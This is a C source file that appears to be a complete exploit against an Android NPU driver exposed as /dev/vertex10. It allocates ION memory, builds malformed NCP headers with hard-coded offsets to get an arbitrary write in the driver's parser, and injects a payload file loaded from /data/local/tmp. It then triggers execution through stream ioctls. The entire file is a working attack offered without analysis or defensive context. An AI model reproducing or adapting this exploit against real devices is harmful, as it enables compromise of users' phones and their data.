#define _GNU_SOURCE

#include <fcntl.h>
#include <linux/android/binder.h>
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sched.h>
#include <sys/wait.h>
#include <time.h>
#include <pthread.h>
#include <sys/eventfd.h>
#include <sys/signalfd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/capability.h>


#define PAYLOAD_OFFSET 0xaf60
#define NPU_SHUTDOWN_OFFSET 0x4EF5c
#define NPU_SHUTDOWN_BYTE_POS (2 - 0x10)
#define NEXT_MALLOC_ADDR 0x89ce8

typedef unsigned int u32;
typedef unsigned long u64;


// ----------------------------------------------------------------------------
// Ion ioctl values

#define ION_HEAP 5

struct ion_allocation_data {
	u64 len;
	u32 heap_id_mask;
	u32 flags;
	u32 fd;
	u32 unused;
};

#define ION_IOC_MAGIC 'I'
#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)


// ----------------------------------------------------------------------------
// Vision ioctl values

enum vs4l_direction {
	VS4L_DIRECTION_IN = 1,
	VS4L_DIRECTION_OT
};

struct vs4l_format {
	u32 target;
	u32 format;
	u32 plane;
	u32 width;
	u32 height;
	u32 stride;
	u32 cstride;
	u32 channels;
	u32 pixel_format;
};

struct vs4l_format_list {
	u32 direction;
	u32 count;
	struct vs4l_format *formats;
};

struct vs4l_graph {
	u32 id;
	u32 priority;
	u32 time; /* in millisecond */
	u32 flags;
	u32 size;
	unsigned long addr;
};

#define VS4L_DF_IMAGE(a, b, c, d)	((a) | (b << 8) | (c << 16) | (d << 24))
#define VS4L_DF_IMAGE_RGB VS4L_DF_IMAGE('R', 'G', 'B', '2')
#define VS4L_DF_IMAGE_RGBX VS4L_DF_IMAGE('R', 'G', 'B', 'A')
#define VS4L_DF_IMAGE_NV12 VS4L_DF_IMAGE('N', 'V', '1', '2')
#define VS4L_DF_IMAGE_NV21 VS4L_DF_IMAGE('N', 'V', '2', '1')
#define VS4L_DF_IMAGE_YUYV VS4L_DF_IMAGE('Y', 'U', 'Y', 'V')
#define VS4L_DF_IMAGE_YUV4 VS4L_DF_IMAGE('Y', 'U', 'V', '4')
#define VS4L_DF_IMAGE_U8 VS4L_DF_IMAGE('U', '0', '0', '8')
#define VS4L_DF_IMAGE_U16 VS4L_DF_IMAGE('U', '0', '1', '6')
#define VS4L_DF_IMAGE_U32 VS4L_DF_IMAGE('U', '0', '3', '2')
#define VS4L_DF_IMAGE_S16 VS4L_DF_IMAGE('S', '0', '1', '6')
#define VS4L_DF_IMAGE_S32 VS4L_DF_IMAGE('S', '0', '3', '2')
#define VS4L_DF_IMAGE_NPU VS4L_DF_IMAGE('N', 'P', 'U', '0')

#define VS4L_VERTEXIOC_S_FORMAT _IOW('V', 1, struct vs4l_format_list)
#define VS4L_VERTEXIOC_STREAM_ON _IO('V', 4)
#define VS4L_VERTEXIOC_STREAM_OFF _IO('V', 5)
#define VS4L_VERTEXIOC_S_GRAPH _IOW('V', 0, struct vs4l_graph)


// ----------------------------------------------------------------------------
// NPU structures

enum ncp_memory_type {
	MEMORY_TYPE_IN_FMAP, /* input feature map */
	MEMORY_TYPE_OT_FMAP, /* output feature map */
	MEMORY_TYPE_IM_FMAP, /* intermediate feature map */
	MEMORY_TYPE_OT_PIX0,
	MEMORY_TYPE_OT_PIX1,
	MEMORY_TYPE_OT_PIX2,
	MEMORY_TYPE_OT_PIX3,
	MEMORY_TYPE_WEIGHT,
	MEMORY_TYPE_WMASK,
	MEMORY_TYPE_LUT,
	MEMORY_TYPE_NCP,
	MEMORY_TYPE_GOLDEN,
	MEMORY_TYPE_CUCODE,
	MEMORY_TYPE_MAX
};

struct memory_vector {
	u32	type;
	u32	pixel_format;
	u32	width;
	u32	height;
	u32	channels;
	u32	wstride;
	u32	cstride;
	u32	address_vector_index;
};


struct group_vector {
	u32	index;
	u32	type;
	u32	size;
	u32	status;
	u32	flags;
	u32	batch;
	u32	intrinsic_offset;
	u32	intrinsic_size;
	u32	isa_offset;
	u32	isa_size;
};

struct ncp_blob {
	unsigned int vector;
	unsigned int offset;
	unsigned int format;
	unsigned int bpp;
	unsigned int n;
	unsigned int c;
	unsigned int h;
	unsigned int w;
	unsigned int w_stride;
	unsigned int c_stride;
	unsigned int n_stride;
};

struct dma_simple_option {
	unsigned int src_vector;
	unsigned int src_offset;
	unsigned int dst_vector;
	unsigned int dst_offset;
	unsigned int size;
};

struct dma_blob_option {
	struct ncp_blob src;
	struct ncp_blob dst;
};

struct io_desc {
	unsigned int uid;
	unsigned int bid;
	unsigned int sgid;
	unsigned int wait_flag;
	unsigned int trig_flag;
	unsigned int mode;
	unsigned int pad;
	unsigned int scale;
	unsigned int bias;

	union {
		struct dma_simple_option simple;
		struct dma_blob_option blob;
	} option;
};


struct ncp_header {
	u32	magic_number1;
	u32	hdr_version;
	u32	hdr_size;
	u32	intrinsic_version;
	u32	net_id;
	u32	unique_id;
	u32	priority;
	u32	flags;
	u32	period;
	u32	workload;
	u32	address_vector_offset;
	u32	address_vector_cnt;
	u32	memory_vector_offset;
	u32	memory_vector_cnt;
	u32	group_vector_offset;
	u32	group_vector_cnt;
	u32	body_version;
	u32	body_offset;
	u32	body_size;
	u32	io_vector_offset;
	u32	io_vector_cnt;
	u32	reserved[10];
	u32	magic_number2;
};

struct drv_usr_share {
	unsigned int id;
	int ncp_fd;
	unsigned int ncp_size;
	unsigned long ncp_mmap;
};

// ----------------------------------------------------------------------------
// Utils

void load_payload(const char* filepath, void** payload, uint32_t *size) {
	FILE* fp = fopen(filepath, "r");
	if (fp == NULL) {
		perror("fopen(payload)");
		exit(0);
	}
	fseek(fp, 0L, SEEK_END);
	*size = ftell(fp);
	*payload = malloc(*size);
	if (*payload == NULL) {
		perror("malloc(payload)");
		exit(0);
	}
	rewind(fp);
	fread(*payload, *size, 1, fp);
}

void init_ncp_header(struct ncp_header *ncp, uint32_t ncp_size,
		void* payload, uint32_t payload_size) {
	memset(ncp, 0, ncp_size);
	memcpy((void*)ncp + PAYLOAD_OFFSET, payload, payload_size);
	ncp->magic_number1 = 0xC0FFEE0;
	ncp->magic_number2 = 0xC0DEC0DE;
    ncp->hdr_version = 22;
	ncp->intrinsic_version = 21;
	ncp->memory_vector_cnt = 2;
	ncp->memory_vector_offset = sizeof(*ncp);
	ncp->address_vector_cnt = 1;
	ncp->address_vector_offset = 0x800 - 4;
    ncp->hdr_size = ncp_size;
	ncp->body_offset = sizeof(*ncp) * 5;
	ncp->body_size = 0x1;
}

void do_graph_format_ioctl(int ncp_fd, int ion_alloc_fd, uint32_t ion_size,
		int direction, int count) {
	/* VS4L_VERTEXIOC_S_GRAPH ioctl */
	struct drv_usr_share usr_share = {
		.ncp_fd = ion_alloc_fd, .ncp_size = ion_size };
	struct vs4l_graph vs4l_graph = { .addr = (uintptr_t) &usr_share };
	ioctl(ncp_fd, VS4L_VERTEXIOC_S_GRAPH, &vs4l_graph);

	/* VS4L_VERTEXIOC_S_FORMAT ioctl */
    struct vs4l_format format[3];
	memset(format, 0, sizeof(format));
	format[0].format = VS4L_DF_IMAGE_NPU;
	format[1].format = VS4L_DF_IMAGE_NPU;
	format[2].format = VS4L_DF_IMAGE_NPU;
    struct vs4l_format_list v4sl_list = {
        .direction = direction, .count = count, .formats = format };
	ioctl(ncp_fd, VS4L_VERTEXIOC_S_FORMAT, &v4sl_list);
}

void exploit_parser_init_arb_write(struct ncp_header *ncp,
		uint32_t ion_alloc_size, void* payload, uint32_t payload_size,
		int ncp_fd, int ion_alloc_fd) {
	init_ncp_header(ncp, ion_alloc_size, payload, payload_size);
	ncp->group_vector_cnt = 1;
	ncp->group_vector_offset = \
		NPU_SHUTDOWN_OFFSET + NPU_SHUTDOWN_BYTE_POS - NEXT_MALLOC_ADDR;
	struct memory_vector *mv = (struct memory_vector *) (ncp + 1);
	mv->type = MEMORY_TYPE_OT_FMAP;
	mv->address_vector_index = 0;
	struct group_vector *gv = (struct group_vector *) (ncp + 2);
    gv->index = 0x0;
    gv->intrinsic_offset = 0x1000;
    gv->flags = 0x1;
	do_graph_format_ioctl(ncp_fd, ion_alloc_fd, ion_alloc_size,
		VS4L_DIRECTION_OT, 1);
}

void setup_in_queue(struct ncp_header *ncp,
		uint32_t ion_alloc_size, void* payload, uint32_t payload_size,
		int ncp_fd, int ion_alloc_fd) {
	init_ncp_header(ncp, ion_alloc_size, payload, payload_size);
	ncp->group_vector_cnt = 1;
	ncp->group_vector_offset = sizeof(*ncp) * 2;
	ncp->io_vector_offset = sizeof(*ncp) * 3;
	ncp->io_vector_cnt = 0x1;
	struct memory_vector *mv = (struct memory_vector *) (ncp + 1);
	(mv)->type = MEMORY_TYPE_IN_FMAP;
	(mv+1)->type = MEMORY_TYPE_IN_FMAP;
	struct group_vector *gv = (struct group_vector *) (ncp + 2);
    gv->index = 0x0;
    gv->intrinsic_offset = 0x0;
    gv->flags = 0x1;
	struct io_desc *id = (struct io_desc *) (ncp + 3);
	id->mode = 0x1;
	id->option.blob.src.vector = 0;
	id->option.blob.src.offset = 0x1000;
	id->option.blob.dst.vector = 1;
	id->option.blob.dst.offset = 0x1000;
	id->option.blob.src.format = 0;
	id->option.blob.dst.format = 0;
	do_graph_format_ioctl(ncp_fd, ion_alloc_fd, ion_alloc_size,
		VS4L_DIRECTION_IN, 3);
}

void setup_out_queue(struct ncp_header *ncp,
		uint32_t ion_alloc_size, void* payload, uint32_t payload_size,
		int ncp_fd, int ion_alloc_fd) {
	init_ncp_header(ncp, ion_alloc_size, payload, payload_size);
	ncp->group_vector_cnt = 1;
	ncp->group_vector_offset = sizeof(*ncp) * 2;
	ncp->io_vector_offset = sizeof(*ncp) * 3;
	ncp->io_vector_cnt = 0x1;
	struct memory_vector *mv = (struct memory_vector *) (ncp + 1);
	(mv)->type = MEMORY_TYPE_OT_FMAP;
	(mv+1)->type = MEMORY_TYPE_OT_FMAP;
	struct group_vector *gv = (struct group_vector *) (ncp + 2);
    gv->index = 0x0;
    gv->intrinsic_offset = 0x0;
    gv->flags = 0x1;
	struct io_desc *id = (struct io_desc *) (ncp + 3);
	id->mode = 0x1;
	id->option.blob.src.vector = 0;
	id->option.blob.src.offset = 0x1000;
	id->option.blob.dst.vector = 1;
	id->option.blob.dst.offset = 0x1000;
	id->option.blob.src.format = 0;
	id->option.blob.dst.format = 0;
	do_graph_format_ioctl(ncp_fd, ion_alloc_fd, ion_alloc_size,
		VS4L_DIRECTION_OT, 3);
}

void trigger (int ncp_fd) {
	ioctl(ncp_fd, VS4L_VERTEXIOC_STREAM_ON);
	ioctl(ncp_fd, VS4L_VERTEXIOC_STREAM_OFF);
}

// ----------------------------------------------------------------------------
// Exploit

int main(int argc, char *argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

	int ret = 0;

	printf("[+] Opening /dev/ion\n");
	int ion_fd = open("/dev/ion", O_RDONLY);
	if (ion_fd < 0) {
		perror("open(/dev/ion)");
		exit(0);
	}

	printf("[+] ION allocation\n");
	uint32_t ion_alloc_size = 0x10000;
	struct ion_allocation_data ion_alloc_data = {
		.len = ion_alloc_size,
		.heap_id_mask = 1 << ION_HEAP,
	};
	ret = ioctl(ion_fd, ION_IOC_ALLOC, &ion_alloc_data);
	if (ret < 0) {
		perror("ioctl(ION_IOC_ALLOC)");
		exit(0);
	}

	printf("[+] ION buffer mapping\n");
	void *ion_map = mmap(NULL, ion_alloc_size, PROT_READ | PROT_WRITE,
		MAP_SHARED, ion_alloc_data.fd, 0);
	if (ion_map == MAP_FAILED) {
		perror("mmap(/dev/ion)");
		exit(0);
	}

	printf("[+] Opening /dev/vertex10\n");
	int ncp_fd = open("/dev/vertex10", O_RDONLY);
	if (ncp_fd < 0) {
		perror("open(/dev/vertex10)");
		exit(0);
	}

	printf("[+] Loading the payload\n");
	uint32_t payload_size = 0;
	void *payload = NULL;
	load_payload("/data/local/tmp/payload.bin", &payload, &payload_size);

	exploit_parser_init_arb_write(
		ion_map, ion_alloc_size, payload, payload_size, ncp_fd,
		ion_alloc_data.fd);
	setup_in_queue(
		ion_map, ion_alloc_size, payload, payload_size, ncp_fd,
		ion_alloc_data.fd);
	setup_out_queue(
		ion_map, ion_alloc_size, payload, payload_size, ncp_fd,
		ion_alloc_data.fd);
	trigger(ncp_fd);
	
	/* Freeing the payload memory */
	free(payload);
	/* Closing /dev/vertex10 */
	close(ion_fd);
	/* Unmapping the ion memory */
	munmap(ion_map, ion_alloc_size);
	/* Closing the ion allocation */
	close(ion_alloc_data.fd);
	/* Closing /dev/ion */
	close(ion_fd);

	return 0;
}
